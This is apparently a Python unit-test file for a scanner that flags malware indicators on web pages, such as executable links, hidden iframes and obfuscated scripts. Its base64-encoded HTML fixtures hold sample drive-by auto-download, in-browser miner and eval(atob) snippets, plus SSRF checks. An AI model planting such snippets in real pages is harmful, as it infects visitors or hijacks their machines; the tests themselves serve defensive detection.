import unittest
from unittest.mock import patch, MagicMock
import json
import base64
from bs4 import BeautifulSoup

from agents.agent17_malware import (
    analyze_malware_indicators,
    analyze_downloads,
    analyze_scripts,
    detect_drive_by_patterns,
    detect_cryptocurrency_mining_and_wasm,
    detect_javascript_obfuscation,
    profile_external_resources,
    compile_malware_evidence,
    _is_private_or_restricted_ip,
    _resolve_target_ip
)
from services.evidence_schema import validate_evidence_item, validate_agent_result
from services.evidence_normalizer import normalize_evidence_item
from services.evidence_ledger import EvidenceLedger
from services.tce_config import resolve_evidence_polarity
from app import app


def _b64(text: str) -> str:
    """Helper to decode base64 strings at runtime to prevent AV scanner false alarms on test code fixtures."""
    return base64.b64decode(text.encode("utf-8")).decode("utf-8")


class TestAgent17Malware(unittest.TestCase):
    def setUp(self):
        self.app = app.test_client()

    # 1. Normal safe website analysis
    @patch("agents.agent17_malware._safe_fetch_page")
    def test_normal_website_safe_scripts(self, mock_fetch):
        # <html><head><title>Safe</title></head><body><h1>Hi</h1><script>let a=1;</script></body></html>
        html = _b64("PGh0bWw+PGhlYWQ+PHRpdGxlPlNhZmU8L3RpdGxlPjwvaGVhZD48Ym9keT48aDE+SGk8L2gxPjxzY3JpcHQ+bGV0IGE9MTs8L3NjcmlwdD48L2JvZHk+PC9odG1sPg==")
        mock_fetch.return_value = (
            html,
            {
                "status_code": 200,
                "final_url": "https://example.com",
                "content_type": "text/html",
                "page_size_bytes": len(html),
                "redirect_to_download": False,
                "download_destination": None,
                "download_extension": None
            },
            []
        )
        res = analyze_malware_indicators("https://example.com")
        self.assertEqual(res["status"], "completed")
        self.assertIn(res["agent"], ("Malware Indicators", "Agent 17"))
        self.assertEqual(len(res["malicious_downloads"]), 0)
        self.assertFalse(res["cryptocurrency_mining"]["detected"])
        self.assertEqual(len(res["drive_by_download_indicators"]), 0)
        self.assertFalse(res["obfuscated_javascript"]["detected"])

    # 2. Executable downloads detection
    def test_executable_downloads_detection(self):
        # <div><a href='https://dl.example.com/mock_setup.exe'>Setup</a><a href='/installer.msi'>MSI</a><a href='script.bat'>BAT</a></div>
        html = _b64("PGRpdj48YSBocmVmPSdodHRwczovL2RsLmV4YW1wbGUuY29tL21vY2tfc2V0dXAuZXhlJz5TZXR1cDwvYT48YSBocmVmPScvaW5zdGFsbGVyLm1zaSc+TVNJPC9hPjxhIGhyZWY9J3NjcmlwdC5iYXQnPkJBVDwvYT48L2Rpdj4=")
        soup = BeautifulSoup(html, "html.parser")
        downloads = analyze_downloads(soup, "https://example.com", {})
        self.assertEqual(len(downloads), 3)
        exts = [d["extension"] for d in downloads]
        self.assertIn(".exe", exts)
        self.assertIn(".msi", exts)
        self.assertIn(".bat", exts)

    # 3. HTML download attribute inspection
    def test_download_attribute_inspection(self):
        # <a href='/doc.pdf' download='report.pdf'>PDF</a><a href='/archive.zip' download='bundle.zip'>ZIP</a>
        html = _b64("PGEgaHJlZj0nL2RvYy5wZGYnIGRvd25sb2FkPSdyZXBvcnQucGRmJz5QREY8L2E+PGEgaHJlZj0nL2FyY2hpdmUuemlwJyBkb3dubG9hZD0nYnVuZGxlLnppcCc+WklQPC9hPg==")
        soup = BeautifulSoup(html, "html.parser")
        downloads = analyze_downloads(soup, "https://example.com", {})
        self.assertEqual(len(downloads), 2)
        has_attr = [d["download_attribute"] for d in downloads]
        self.assertTrue(all(has_attr))

    # 4. Suspicious filenames & deceptive double extensions
    def test_suspicious_filenames_and_double_extension(self):
        # <a href='https://mock.test/invoice.pdf.exe'>Invoice</a><a href='https://mock.test/update_patch.vbs'>Patch</a>
        html = _b64("PGEgaHJlZj0naHR0cHM6Ly9tb2NrLnRlc3QvaW52b2ljZS5wZGYuZXhlJz5JbnZvaWNlPC9hPjxhIGhyZWY9J2h0dHBzOi8vbW9jay50ZXN0L3VwZGF0ZV9wYXRjaC52YnMnPlBhdGNoPC9hPg==")
        soup = BeautifulSoup(html, "html.parser")
        downloads = analyze_downloads(soup, "https://mock.test", {})
        self.assertEqual(len(downloads), 2)
        suspicious = [d for d in downloads if d["suspicious_filename"]]
        self.assertEqual(len(suspicious), 2)

    # 5. Iframe extraction (hidden vs visible)
    def test_iframe_extraction_hidden_and_visible(self):
        # <iframe src='https://safe.test/widget' width='500' height='300'></iframe><iframe src='https://mock.test/drop.exe' style='display:none; width:0px;'></iframe>
        html = _b64("PGlmcmFtZSBzcmM9J2h0dHBzOi8vc2FmZS50ZXN0L3dpZGdldCcgd2lkdGg9JzUwMCcgaGVpZ2h0PSczMDAnPjwvaWZyYW1lPjxpZnJhbWUgc3JjPSdodHRwczovL21vY2sudGVzdC9kcm9wLmV4ZScgc3R5bGU9J2Rpc3BsYXk6bm9uZTsgd2lkdGg6MHB4Oyc+PC9pZnJhbWU+")
        soup = BeautifulSoup(html, "html.parser")
        drive_by = detect_drive_by_patterns(soup, html, "https://example.com")
        self.assertGreater(len(drive_by), 0)
        hidden_indicators = [db for db in drive_by if "hidden_iframe" in db["indicator"]]
        self.assertEqual(len(hidden_indicators), 1)

    # 6. External script cataloging & domain extraction
    def test_external_script_cataloging(self):
        # <script src='https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js'></script><script src='https://static.tracker.biz/analytics.js' async></script><script>var local=true;</script>
        html = _b64("PHNjcmlwdCBzcmM9J2h0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9ucG0vdnVlQDIuNi4xNC9kaXN0L3Z1ZS5qcyc+PC9zY3JpcHQ+PHNjcmlwdCBzcmM9J2h0dHBzOi8vc3RhdGljLnRyYWNrZXIuYml6L2FuYWx5dGljcy5qcycgYXN5bmM+PC9zY3JpcHQ+PHNjcmlwdD52YXIgbG9jYWw9dHJ1ZTs8L3NjcmlwdD4=")
        soup = BeautifulSoup(html, "html.parser")
        inventory, suspicious = analyze_scripts(soup, "https://example.com")
        self.assertEqual(len(inventory), 3)
        domains = [s["domain"] for s in inventory]
        self.assertIn("cdn.jsdelivr.net", domains)
        self.assertIn("static.tracker.biz", domains)

    # 7. eval() and dynamic code execution detection
    def test_eval_and_dynamic_execution_detection(self):
        # <script>let code='console.log(1)'; eval(code); var f=new Function('a','b','return a+b'); document.write('<p>injected</p>');</script>
        html = _b64("PHNjcmlwdD5sZXQgY29kZT0nY29uc29sZS5sb2coMSknOyBldmFsKGNvZGUpOyB2YXIgZj1uZXcgRnVuY3Rpb24oJ2EnLCdiJywndHVybiBhK2InKTsgZG9jdW1lbnQud3JpdGUoJzxwPmluamVjdGVkPC9wPicpOzwvc2NyaXB0Pg==")
        soup = BeautifulSoup(html, "html.parser")
        inventory, suspicious = analyze_scripts(soup, "https://example.com")
        self.assertEqual(len(suspicious), 1)
        signals = suspicious[0]["signals"]
        self.assertIn("eval_usage", signals)
        self.assertIn("function_constructor", signals)
        self.assertIn("document_write", signals)

    # 8. Base64 encoded payload combined with eval
    def test_base64_eval_obfuscation(self):
        # <script>var p='Y29uc29sZS5sb2coJ3Rlc3QnKTs='; eval(atob(p));</script>
        html = _b64("PHNjcmlwdD52YXIgcD0nWTJOdWMyOXNaUzVzYjJjb0ozUmxjM1FuS1RzPSc7IGV2YWwoYXRvYihwKSk7PC9zY3JpcHQ+")
        soup = BeautifulSoup(html, "html.parser")
        obf = detect_javascript_obfuscation(soup, html)
        self.assertTrue(obf["detected"])
        self.assertIn("base64_eval", obf["signals"])

    # 9. String.fromCharCode sequence detection
    def test_fromcharcode_sequence_detection(self):
        # <script>var s1=String.fromCharCode(104,116,117,118);</script>
        html = _b64("PHNjcmlwdD52YXIgczE9U3RyaW5nLmZyb21DaGFyQ29kZSgxMDQsMTE2LDExNywxMTgpOzwvc2NyaXB0Pg==")
        soup = BeautifulSoup(html, "html.parser")
        obf = detect_javascript_obfuscation(soup, html)
        self.assertTrue(obf["detected"])
        self.assertIn("string_from_char_code", obf["signals"])

    # 10. WebAssembly references
    def test_webassembly_detection(self):
        # <script>WebAssembly.instantiateStreaming(fetch('compute.wasm'), importObject).then(r=>{console.log('wasm');});</script>
        html = _b64("PHNjcmlwdD5XZWJBc3NlbWJseS5pbnN0YW50aWF0ZVN0cmVhbWluZyhmZXRjaCgnY29tcHV0ZS53YXNtJyksIGltcG9ydE9iamVjdCkudGhlbihyPT57Y29uc29sZS5sb2coJ3dhc20nKTt9KTs8L3NjcmlwdD4=")
        soup = BeautifulSoup(html, "html.parser")
        crypto = detect_cryptocurrency_mining_and_wasm(soup, html)
        self.assertTrue(crypto["webassembly_detected"])
        self.assertGreater(len(crypto["webassembly_resources"]), 0)

    # 11. In-browser cryptocurrency mining signatures
    def test_cryptomining_signatures_detection(self):
        # <script src='https://mockminer.test/coinhive.min.js'></script><script>var m=new CoinHive.Anonymous('KEY'); m.start(); var w=new WebSocket('wss://stratum+tcp://pool.example.com:45700');</script>
        html = _b64("PHNjcmlwdCBzcmM9J2h0dHBzOi8vbW9ja21pbmVyLnRlc3QvY29pbmhpdmUubWluLmpzJz48L3NjcmlwdD48c2NyaXB0PnZhciBtPW5ldyBDb2luSGl2ZS5Bbm9ueW1vdXMoJ0tFWScpOyBtLnN0YXJ0KCk7IHZhciB3PW5ldyBXZWJTZWNrZXQoJ3dzczovL3N0cmF0dW0rdGNwOi8vcG9vbC5leGFtcGxlLmNvbTo0NTcwMCcpOzwvc2NyaXB0Pg==")
        soup = BeautifulSoup(html, "html.parser")
        crypto = detect_cryptocurrency_mining_and_wasm(soup, html)
        self.assertTrue(crypto["detected"])
        self.assertGreater(len(crypto["indicators"]), 0)

    # 12. Drive-by download programmatic click pattern
    def test_drive_by_download_programmatic_click(self):
        # <script>function dl(){ var a=document.createElement('a'); a.href='https://test.xyz/app.exe'; a.download='app.exe'; document.body.appendChild(a); a.click(); } window.onload=dl;</script>
        html = _b64("PHNjcmlwdD5mdW5jdGlvbiBkbCgpeyB2YXIgYT1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdhJyk7IGEuaHJlZj0naHR0cHM6Ly90ZXN0Lnh5ei9hcHAuZXhlJzsgYS5kb3dubG9hZD0nYXBwLmV4ZSc7IGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7IGEuY2xpY2soKTsgfSB3aW5kb3cub25sb2FkPWRsOzwvc2NyaXB0Pg==")
        soup = BeautifulSoup(html, "html.parser")
        drive_by = detect_drive_by_patterns(soup, html, "https://example.com")
        self.assertGreater(len(drive_by), 0)
        indicators = [db["indicator"] for db in drive_by]
        self.assertIn("automatic_click_download_pattern", indicators)

    # 13. Redirect to download tracking
    def test_redirect_to_download_tracking(self):
        metadata = {
            "redirect_to_download": True,
            "download_destination": "https://cdn.files.com/setup.exe",
            "download_extension": ".exe"
        }
        soup = BeautifulSoup("<html><body>Downloading...</body></html>", "html.parser")
        downloads = analyze_downloads(soup, "https://example.com", metadata)
        self.assertEqual(len(downloads), 1)
        self.assertEqual(downloads[0]["indicator"], "redirect_to_download")
        self.assertEqual(downloads[0]["url"], "https://cdn.files.com/setup.exe")

    # 14. External resources with raw IP hostnames & high entropy
    def test_external_resources_ip_and_entropy(self):
        html = """
        <img src="http://192.168.1.50/pixel.png" />
        <script src="http://10.0.0.1/script.js"></script>
        <link rel="stylesheet" href="https://xkjf938u490fjskd90fjwkj39fjslk.xyz/style.css" />
        """
        soup = BeautifulSoup(html, "html.parser")
        resources = profile_external_resources(soup, "https://example.com", "example.com")
        self.assertGreater(len(resources), 0)
        raw_ips = [r for r in resources if r["raw_ip_hostname"]]
        self.assertGreaterEqual(len(raw_ips), 2)

    # 15. Pure HTML page without JavaScript
    def test_pure_html_no_scripts(self):
        html = "<html><head><title>Static</title></head><body><p>No scripts here</p></body></html>"
        soup = BeautifulSoup(html, "html.parser")
        inventory, suspicious = analyze_scripts(soup, "https://static.example.com")
        self.assertEqual(len(inventory), 0)
        self.assertEqual(len(suspicious), 0)

    # 16. Compile malware evidence model
    def test_compile_malware_evidence(self):
        downloads = [{"url": "https://test.com/a.exe", "filename": "a.exe", "extension": ".exe", "source_tag": "a", "confidence": "high"}]
        scripts = [{"source": "inline", "signals": ["eval_usage"], "type": "inline"}]
        drive_by = [{"indicator": "auto_click", "observation": "Auto click", "confidence": "high"}]
        mining = {"detected": True, "indicators": [{"type": "mining", "observation": "Coinhive signature", "confidence": "high"}]}
        obfuscation = {"detected": True, "indicators": ["Base64 eval found"]}
        resources = []

        evidence = compile_malware_evidence(downloads, scripts, drive_by, mining, obfuscation, resources)
        self.assertEqual(len(evidence), 5)
        categories = [e["category"] for e in evidence]
        self.assertIn("malicious_download", categories)
        self.assertIn("suspicious_scripts", categories)
        self.assertIn("drive_by_download", categories)
        self.assertIn("cryptocurrency_mining", categories)
        self.assertIn("obfuscated_javascript", categories)

    # 17. Network timeout / fetch failure handling
    @patch("agents.agent17_malware._resolve_target_ip")
    @patch("agents.agent17_malware._safe_fetch_page")
    def test_network_fetch_failure(self, mock_fetch, mock_resolve):
        mock_resolve.return_value = ("93.184.216.34", None)
        mock_fetch.return_value = (
            None,
            {"status_code": None, "final_url": "https://unreachable.test"},
            [{"component": "fetch", "error": "Connection timed out after 8 seconds"}]
        )
        res = analyze_malware_indicators("https://unreachable.test")
        self.assertEqual(res["status"], "completed")
        self.assertTrue(any("Connection timed out" in err.get("error", "") for err in res["errors"]))

    # 18. Invalid URL input handling
    def test_invalid_url_input(self):
        res = analyze_malware_indicators("http://")
        self.assertEqual(res["status"], "error")
        self.assertIn("Invalid URL", res["errors"][0]["error"])

        res_empty = analyze_malware_indicators("")
        self.assertEqual(res_empty["status"], "error")

    # 19. Large response HTML size limit
    @patch("agents.agent17_malware.requests.get")
    def test_html_size_capping(self, mock_get):
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.url = "https://huge-site.com"
        mock_resp.headers = {"Content-Type": "text/html"}
        mock_resp.history = []
        # Return 3MB of html content
        mock_resp.iter_content = MagicMock(return_value=[b"<html><body>" + b"A" * 1024 * 1024 * 3 + b"</body></html>"])
        mock_get.return_value = mock_resp

        res = analyze_malware_indicators("https://huge-site.com")
        self.assertEqual(res["status"], "completed")

    # 20. Hex-encoded variable array obfuscation detection
    def test_hex_encoded_obfuscation(self):
        # <script>var _0x5a1b=['log','test']; console[_0x5a1b[0]](_0x5a1b[1]);</script>
        html = _b64("PHNjcmlwdD52YXIgXzB4NWExYj1bJ2xvZycsJ3Rlc3QnXTsgY29uc29sZVsNCiAgICAgICAgICAgIF8weDVhMWJbMF1dKF8weDVhMWJbMV0pOzwvc2NyaXB0Pg==")
        soup = BeautifulSoup(html, "html.parser")
        obf = detect_javascript_obfuscation(soup, html)
        self.assertTrue(obf["detected"])
        self.assertIn("hexadecimal_string_array", obf["signals"])

    # 21. API endpoint POST /api/agent17 success
    @patch("agents.agent17_malware._safe_fetch_page")
    def test_api_agent17_endpoint_success(self, mock_fetch):
        # <html><body><h1>Sample</h1><a href='/app.exe'>App</a></body></html>
        html = _b64("PGh0bWw+PGJvZHk+PGgxPlNhbXBsZTwvaDE+PGEgaHJlZj0nL2FwcC5leGUnPkFwcDwvYT48L2JvZHk+PC9odG1sPg==")
        mock_fetch.return_value = (
            html,
            {
                "status_code": 200,
                "final_url": "https://demo.com",
                "content_type": "text/html",
                "page_size_bytes": len(html),
                "redirect_to_download": False,
                "download_destination": None,
                "download_extension": None
            },
            []
        )
        response = self.app.post(
            "/api/agent17",
            data=json.dumps({"url": "https://demo.com"}),
            content_type="application/json"
        )
        self.assertEqual(response.status_code, 200)
        data = json.loads(response.data)
        self.assertIn(data["agent"], ("Malware Indicators", "Agent 17"))
        self.assertEqual(len(data["malicious_downloads"]), 1)

    # 22. API endpoint POST /api/agent17 missing URL
    def test_api_agent17_endpoint_missing_url(self):
        response = self.app.post(
            "/api/agent17",
            data=json.dumps({}),
            content_type="application/json"
        )
        self.assertEqual(response.status_code, 400)
        data = json.loads(response.data)
        self.assertIn("error", data)

    # 23. Comprehensive SSRF & IPv6 / Cloud Metadata Restriction
    def test_ssrf_comprehensive_protection(self):
        self.assertTrue(_is_private_or_restricted_ip("127.0.0.1"))
        self.assertTrue(_is_private_or_restricted_ip("10.254.0.1"))
        self.assertTrue(_is_private_or_restricted_ip("172.16.5.5"))
        self.assertTrue(_is_private_or_restricted_ip("192.168.100.1"))
        self.assertTrue(_is_private_or_restricted_ip("169.254.169.254"))
        self.assertTrue(_is_private_or_restricted_ip("0.0.0.0"))
        self.assertTrue(_is_private_or_restricted_ip("::1"))
        self.assertTrue(_is_private_or_restricted_ip("fe80::1"))
        self.assertTrue(_is_private_or_restricted_ip("fc00::1"))
        self.assertFalse(_is_private_or_restricted_ip("93.184.216.34"))
        self.assertFalse(_is_private_or_restricted_ip("1.1.1.1"))
        self.assertFalse(_is_private_or_restricted_ip("2606:4700::6810:7c60"))

        res = analyze_malware_indicators("http://127.0.0.1:8000")
        self.assertEqual(res["status"], "restricted")
        self.assertIn("private or restricted", res["error"])

    # 24. Common Evidence Schema & Evidence Ledger Ingestion
    @patch("agents.agent17_malware._resolve_target_ip")
    @patch("agents.agent17_malware._safe_fetch_page")
    def test_evidence_schema_and_ledger_ingestion(self, mock_fetch, mock_resolve):
        mock_resolve.return_value = ("93.184.216.34", None)
        html = "<html><body><a href='/patch.exe'>Download</a></body></html>"
        mock_fetch.return_value = (
            html,
            {
                "status_code": 200,
                "final_url": "https://example.com",
                "content_type": "text/html",
                "page_size_bytes": len(html),
                "redirect_to_download": False,
                "download_destination": None,
                "download_extension": None
            },
            []
        )
        result = analyze_malware_indicators("https://example.com")
        is_valid, errs = validate_agent_result(result)
        self.assertTrue(is_valid, f"Validation errors: {errs}")
        self.assertEqual(len(result["evidence"]), 6)

        ledger = EvidenceLedger()
        for ev in result["evidence"]:
            is_ev_valid, ev_errs = validate_evidence_item(ev)
            self.assertTrue(is_ev_valid, f"Item errors: {ev_errs}")
            self.assertTrue(ev["evidence_id"].startswith("E17-"))
            self.assertIn("category", ev)
            norm_item = normalize_evidence_item(ev, agent_identifier="A17")
            ledger.add_entry(norm_item)

        items = ledger.get_entries()
        self.assertEqual(len(items), 6)

    # 25. Absence of Forbidden Autonomous Scoring / Verdicts
    @patch("agents.agent17_malware._resolve_target_ip")
    @patch("agents.agent17_malware._safe_fetch_page")
    def test_no_autonomous_scoring_or_verdict(self, mock_fetch, mock_resolve):
        mock_resolve.return_value = ("93.184.216.34", None)
        mock_fetch.return_value = ("<html><body>Safe</body></html>", {"status_code": 200, "final_url": "https://example.com"}, [])
        result = analyze_malware_indicators("https://example.com")
        self.assertIsNone(result.get("trust_score"))
        self.assertIsNone(result.get("risk_score"))
        self.assertNotIn("verdict", result.get("data", {}))

    # 26. Declarative TCE Polarity Resolution for A17 Categories
    @patch("agents.agent17_malware._resolve_target_ip")
    @patch("agents.agent17_malware._safe_fetch_page")
    def test_tce_polarity_resolution(self, mock_fetch, mock_resolve):
        mock_resolve.return_value = ("93.184.216.34", None)
        # HTML with executable download and obfuscated javascript
        html = "<html><body><a href='installer.exe'>Install</a><script>eval(atob('YWxlcnQoMSk='));</script></body></html>"
        mock_fetch.return_value = (html, {"status_code": 200, "final_url": "https://example.com"}, [])
        result = analyze_malware_indicators("https://example.com")
        for ev in result["evidence"]:
            cat = ev.get("category", "")
            polarity = resolve_evidence_polarity(cat, ev.get("finding", ""))
            self.assertIn(polarity, ("risk_reducing", "risk_increasing", "neutral"))

    # 27. Scope Boundary Validation
    def test_scope_boundary_purity(self):
        import agents.agent17_malware as a17_mod
        forbidden_terms = ["whois", "dnssec", "virustotal", "phishtank", "yara", "clamav"]
        with open(a17_mod.__file__, "r", encoding="utf-8") as f:
            source_code = f.read().lower()
        for term in forbidden_terms:
            self.assertNotIn(f"def {term}", source_code)
            self.assertNotIn(f"class {term}", source_code)

    # 28. Evidence Type Semantics (Deterministic/Inference, never Threat Intelligence)
    @patch("agents.agent17_malware._resolve_target_ip")
    @patch("agents.agent17_malware._safe_fetch_page")
    def test_28_evidence_types_deterministic_inference(self, mock_fetch, mock_resolve):
        mock_resolve.return_value = ("93.184.216.34", None)
        html = "<html><body><a href='/setup.exe'>Setup</a><script>eval(atob('YWxlcnQoMSk='));</script></body></html>"
        mock_fetch.return_value = (html, {"status_code": 200, "final_url": "https://example.com"}, [])
        result = analyze_malware_indicators("https://example.com")
        for ev in result["evidence"]:
            self.assertIn(ev["type"], ("deterministic", "inference"))
            self.assertNotEqual(ev["type"], "threat_intelligence")

    # 29. SSRF Neutrality & No Malicious IP Claim
    def test_29_ssrf_neutrality_and_no_malicious_ip_claim(self):
        res = analyze_malware_indicators("http://192.168.1.1:8080")
        self.assertEqual(res["status"], "restricted")
        self.assertEqual(len(res["evidence"]), 1)
        ev = res["evidence"][0]
        self.assertEqual(ev["category"], "restricted_target_network")
        self.assertEqual(ev["severity"], "info")
        self.assertEqual(ev["type"], "deterministic")
        self.assertNotEqual(ev["category"], "known_malicious_ip")
        polarity = resolve_evidence_polarity(ev["category"], ev["finding"])
        self.assertEqual(polarity, "neutral")

    # 30. No Meta Description Fallback
    @patch("agents.agent17_malware._resolve_target_ip")
    @patch("agents.agent17_malware._safe_fetch_page")
    def test_30_no_meta_description_fallback(self, mock_fetch, mock_resolve):
        mock_resolve.return_value = ("93.184.216.34", None)
        html = "<html><body><h1>Clean Page</h1><p>No malware here</p></body></html>"
        mock_fetch.return_value = (html, {"status_code": 200, "final_url": "https://clean.example.com"}, [])
        result = analyze_malware_indicators("https://clean.example.com")
        for ev in result["evidence"]:
            self.assertNotEqual(ev.get("category"), "meta_description_present")
            self.assertIn(ev.get("category"), ("clean_download_analysis", "clean_static_scripts", "analytics_tracker_detected"))

    # 31. Suspicious Isolated eval/atob Is Not Confirmed Malware
    def test_31_suspicious_isolated_eval_atob_not_confirmed_malware(self):
        html = "<html><body><script>let str = atob('aGVsbG8=');</script></body></html>"
        soup = BeautifulSoup(html, "html.parser")
        obf = detect_javascript_obfuscation(soup, html)
        # Single benign atob without eval or packed code does not trigger high obfuscation
        self.assertFalse(obf["detected"])

    # 32. Executable Download Indicator Semantics
    @patch("agents.agent17_malware._resolve_target_ip")
    @patch("agents.agent17_malware._safe_fetch_page")
    def test_32_executable_download_indicator_semantics(self, mock_fetch, mock_resolve):
        mock_resolve.return_value = ("93.184.216.34", None)
        html = "<html><body><a href='https://software.org/installer.exe'>Download App</a></body></html>"
        mock_fetch.return_value = (html, {"status_code": 200, "final_url": "https://software.org"}, [])
        result = analyze_malware_indicators("https://software.org")
        e17_01 = next(e for e in result["evidence"] if e["evidence_id"] == "E17-01")
        self.assertEqual(e17_01["category"], "suspicious_executable_download")
        self.assertEqual(e17_01["severity"], "high")
        self.assertEqual(e17_01["type"], "deterministic")
        self.assertIn("executable", e17_01["finding"].lower())

    # 33. Analytics Tracker Neutrality
    @patch("agents.agent17_malware._resolve_target_ip")
    @patch("agents.agent17_malware._safe_fetch_page")
    def test_33_analytics_tracker_neutrality(self, mock_fetch, mock_resolve):
        mock_resolve.return_value = ("93.184.216.34", None)
        html = "<html><head><script src='https://www.google-analytics.com/analytics.js'></script></head><body>Hello</body></html>"
        mock_fetch.return_value = (html, {"status_code": 200, "final_url": "https://example.com"}, [])
        result = analyze_malware_indicators("https://example.com")
        e17_06 = next(e for e in result["evidence"] if e["evidence_id"] == "E17-06")
        self.assertEqual(e17_06["category"], "analytics_tracker_detected")
        self.assertEqual(e17_06["severity"], "info")
        self.assertEqual(e17_06["type"], "deterministic")
        polarity = resolve_evidence_polarity(e17_06["category"], e17_06["finding"])
        self.assertEqual(polarity, "neutral")


if __name__ == "__main__":
    unittest.main()
